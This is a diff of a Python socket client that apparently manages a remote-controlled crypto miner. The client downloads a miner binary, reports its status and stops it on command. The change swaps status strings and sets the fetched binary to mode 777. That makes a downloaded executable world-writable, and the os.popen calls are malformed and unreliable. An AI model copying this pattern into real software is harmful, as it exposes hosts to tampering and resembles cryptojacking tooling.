@@ -59,9 +59,9 @@ def client():
 
             elif data == "stat":
                 if task_exists(rig):
-                    c.sendall("Running".encode())
+                    c.sendall("Active".encode())
                 else:
-                    c.sendall("Not Running".encode())
+                    c.sendall("Inactive".encode())
 
             elif data == "miner stop":
                 if task_exists(rig):
@@ -86,7 +86,7 @@ def client():
                         f.write(response.content)
 
                 if sys.platform == "linux":
-                    os.popen("chmod +x", rig)
+                    os.popen("chmod 777", rig)
 
                 if os.path.exists(rig):
                     if not task_exists(rig):
